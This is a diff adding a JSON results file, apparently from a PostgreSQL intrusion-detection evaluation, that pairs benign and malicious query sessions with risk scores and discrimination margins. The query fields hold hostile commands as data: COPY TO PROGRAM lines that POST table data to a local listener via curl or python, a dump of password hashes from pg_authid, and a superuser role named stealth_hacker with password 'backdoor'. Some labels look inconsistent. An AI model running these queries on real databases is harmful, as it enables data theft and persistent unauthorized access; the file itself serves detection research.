+            "os_risk": 0.5555,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0233,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0229,
+          "cross_margin": 0.0,
+          "margin_widened": -0.0229,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "101513",
+            "filename": "enriched_session_101513_Normal.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.5472,
+            "os_status": "benign",
+            "cross_risk": 0.6542,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "109804",
+            "filename": "enriched_session_109804_Data_Exfiltration.graphml",
+            "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'python3 -c  import urllib.request, sys; req = urllib.request.Request(  http://127.0.0.1:9090  , data=sys.stdin.read().encode(), method=  POST  ); urllib.request.urlopen(req)  > /dev/null 2>&1 || true';",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 3,
+            "file_count": 119,
+            "endpoint_count": 1,
+            "os_risk": 0.7331,
+            "os_status": "alert",
+            "cross_risk": 0.7224,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.9669,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.1859,
+          "cross_margin": 0.0682,
+          "margin_widened": -0.1177,
+          "os_discriminated": true,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "101574",
+            "filename": "enriched_session_101574_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5498,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "114093",
+            "filename": "enriched_session_114093_OS_Privilege_Escalation.graphml",
+            "query": "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';",
+            "tables": [
+              "('Table', 'pg_authid')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5775,
+            "os_status": "benign",
+            "cross_risk": 0.6331,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0277,
+          "cross_margin": 0.6331,
+          "margin_widened": 0.6054,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        }
+      ]
+    }
+  },
+  "exemplars": {
+    "COPY": {
+      "category": "COPY",
+      "benign": {
+        "session_id": "100067",
+        "filename": "enriched_session_100067_Normal.graphml",
+        "query": "COPY (SELECT aid, bid, abalance FROM pgbench_accounts LIMIT 100) TO PROGRAM 'gzip > /var/backups/accounts_backup.gz';",
+        "tables": [
+          "('Table', 'pgbench_accounts')"
+        ],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.5462,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "malicious": {
+        "session_id": "100082",
+        "filename": "enriched_session_100082_Data_Exfiltration.graphml",
+        "query": "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'gzip > /tmp/accounts_exfil.gz && curl -s -X POST -d @/tmp/accounts_exfil.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
+        "tables": [
+          "('Table', 'pgbench_accounts')"
+        ],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.549,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "similarity": {
+        "file_jaccard": 1.0,
+        "proc_similarity": 1.0,
+        "feature_cosine_sim": 1.0
+      },
+      "os_margin": 0.0,
+      "cross_margin": 0.0028,
+      "margin_widened": 0.0028,
+      "os_discriminated": false,
+      "cross_discriminated": false
+    },
+    "DB_Privilege": {
+      "category": "DB_Privilege",
+      "benign": {
+        "session_id": "100157",
+        "filename": "enriched_session_100157_Normal.graphml",
+        "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+        "tables": [],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.5647,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "malicious": {
+        "session_id": "109463",
+        "filename": "enriched_session_109463_Data_Exfiltration.graphml",
+        "query": "CREATE TABLE IF NOT EXISTS temp_load (id INT, role TEXT, note TEXT);",
+        "tables": [],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.5626,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "similarity": {
+        "file_jaccard": 1.0,
+        "proc_similarity": 1.0,
+        "feature_cosine_sim": 1.0
+      },
+      "os_margin": 0.0,
+      "cross_margin": -0.0021,
+      "margin_widened": -0.0021,
+      "os_discriminated": false,
+      "cross_discriminated": false
+    },
+    "Sensitive_Access": {
+      "category": "Sensitive_Access",
+      "benign": {
+        "session_id": "100068",
+        "filename": "enriched_session_100068_Normal.graphml",
+        "query": "select count(*) from pgbench_branches",
+        "tables": [
+          "('Table', 'pgbench_branches')"
+        ],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.5455,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "malicious": {
+        "session_id": "109455",
+        "filename": "enriched_session_109455_Data_Exfiltration.graphml",
+        "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+        "tables": [
+          "('Table', 'pgbench_accounts')"
+        ],
+        "proc_count": 0,
+        "file_count": 0,
+        "endpoint_count": 0,
+        "os_risk": 0.5384,
+        "os_status": "benign",
+        "cross_risk": 0.5596,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "similarity": {
+        "file_jaccard": 1.0,
+        "proc_similarity": 1.0,
+        "feature_cosine_sim": 1.0
+      },
+      "os_margin": 0.0,
+      "cross_margin": 0.0141,
+      "margin_widened": 0.0141,
+      "os_discriminated": false,
+      "cross_discriminated": false
+    },
+    "Network_File": {
+      "category": "Network_File",
+      "benign": {
+        "session_id": "100555",
+        "filename": "enriched_session_100555_Normal.graphml",
+        "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+        "tables": [],
+        "proc_count": 1,
+        "file_count": 9,
+        "endpoint_count": 0,
+        "os_risk": 0.6291,
+        "os_status": "benign",
+        "cross_risk": 0.0,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "malicious": {
+        "session_id": "100176",
+        "filename": "enriched_session_100176_Data_Exfiltration.graphml",
+        "query": "CREATE EXTENSION IF NOT EXISTS pgcrypto;",
+        "tables": [],
+        "proc_count": 1,
+        "file_count": 9,
+        "endpoint_count": 0,
+        "os_risk": 0.5822,
+        "os_status": "benign",
+        "cross_risk": 0.5521,
+        "cross_status": "benign",
+        "cross_rule": null
+      },
+      "similarity": {
+        "file_jaccard": 1.0,
+        "proc_similarity": 1.0,
+        "feature_cosine_sim": 1.0
+      },
+      "os_margin": 0.0469,
+      "cross_margin": 0.5521,
+      "margin_widened": 0.5052,
+      "os_discriminated": false,
+      "cross_discriminated": false
+    }
+  }
+}
